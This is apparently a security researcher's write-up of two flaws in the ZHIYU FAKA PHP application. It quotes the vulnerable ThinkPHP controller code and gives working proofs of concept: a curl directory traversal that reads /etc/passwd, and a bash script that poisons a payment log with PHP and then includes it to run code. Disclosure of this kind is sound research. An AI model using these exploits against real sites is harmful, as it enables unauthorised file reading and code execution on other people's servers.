---
title: ZHIYU FAKA Vulnerabilities
date: 2021-11-14 19:50:43
updated: 2021-11-14 19:50:43
tags:
- web-security
- php
- directory-traversal
- local-file-inclusion
---

## 0x01 Overview

Testing Environment:

- PHP Version: 7.0
- ThinkPHP Version: 5.0.14
- Local Testing Domain: zyfk.vuln.io

<!--more-->
## 0x02 Directory Traversal

### 0x021 Source File

`application/wechat/controller/Review.php`

```php
...
    /**
     * 微信图片显示
     */
    public function img()
    {
        $url = $this->request->get('url', '');
        $filename = FileService::getFileName($url, 'jpg', 'tmp/');
        if (false === ($img = FileService::getFileUrl($filename))) {
            $info = FileService::save($filename, file_get_contents($url));
            $img = (is_array($info) && isset($info['url'])) ? $info['url'] : $url;
        }
        $this->redirect($img);
    }
...
```

In the `img` function, the server takes the GET parameter `url` from the user and then saves it to a local/remote location. Then the server will serve this file to the user by a `302` redirect. However, in **line 7** we can see that the `url` parameter here is not validated, which allows directory traversal if `open_basedir` is not set correctly. With `open_basedir` set to the website directory, log files and source code can still be obtained by exploiting this vulnerability.

### 0x022 PoC

```console
$ curl -L "http://zyfk.vuln.io/wechat/review/img?url=/etc/passwd"
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
...
```

## 0x03 Local File Inclusion

### 0x031 Source File

`application/wechat/controller/Review.php`

```php
...
    public function index()
    {
        $get = $this->request->get();
        $content = str_replace("\n", "<br>", $this->request->get('content', '')); // 内容
        $type = $this->request->get('type', 'text'); // 类型
        $this->assign('type', $type);
        // 图文处理
        if ($type === 'news' && is_numeric($content) && !empty($content)) {
            $news = WechatService::getNewsById($content);
            $this->assign('articles', $news['articles']);
        }
        // 文章预览
        if ($type === 'article' && is_numeric($content) && !empty($content)) {
            $article = Db::name('WechatNewsArticle')->where('id', $content)->find();
            if (!empty($article['content_source_url'])) {
                $this->redirect($article['content_source_url']);
            }
            $this->assign('vo', $article);
        }
        $this->assign($get);
        $this->assign('content', $content);
        // 渲染模板并显示
        return view();
    }
...
```

In **line 21**, `$get` object is passed to `assign` method unvalidated. By passing `cacheFile` in a GET call:
`http://zyfk.vuln.io/wechat/review/index/?cacheFile=${file_path}`

The server will execute `include $file_path`, as explained in detail [here](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7.md). This vulnerability is only valid if **5.0.0 <= ThinkPHP Version <= 5.0.18 OR 5.1.0 <= ThinkPHP Version <= 5.1.10**.

To further exploit this vulnerability, we need somewhere to upload our PHP payload.
In `application/payment/controller/Index.php`:

```php
...
    public function notify()
    {
        file_put_contents(LOG_PATH . 'payment_notify.txt', "【" . date('Y-m-d H:i:s') . "】\r\n" . file_get_contents("php://input") . "\r\n\r\n", FILE_APPEND);

        $channelId = input('channel/s', '');
        if (empty($channelId)) {
            die('false');
        }

        $params = $this->getParams($channelId);
        list($cash, $account) = $this->getCashInfo($params);

        //查找渠道
        try {
            $channel = CashChannel::get(['code' => $channelId]);
            $class = '\\app\\common\\payment\\' . $channel->code;
            $obj = new $class($account);
            $res = $obj->notify($params, $cash);
        } catch (Exception $e) {
            echo 'FALSE';
            exit;
        }
    }
...
```

In **line 4**, the POST content is saved to `LOG_PATH + payment_notify.txt` without any validation, where the PHP payload can be uploaded.

### 0x032 PoC

`zhiyu-faka-lfi-exploit.sh`

```bash
#!/bin/bash
echo "posting php payload..."
curl -d "<?php echo 'exploited successfully!'; ?>" -X POST "http://zyfk.vuln.io/payment/index/notify/" > /dev/null
echo "executing payload..."
curl "http://zyfk.vuln.io/wechat/review/index/?cacheFile=runtime/log/payment_notify.txt"
```

Result:

```console
$ ./zhiyu-faka-lfi-exploit.sh
posting php payload...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    43    0     5  100    38    120    915 --:--:-- --:--:-- --:--:--  1264
executing payload...
【2021-10-20 12:22:39】
exploited successfully!
```

## 0x04 Reference

1. [ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7.md)
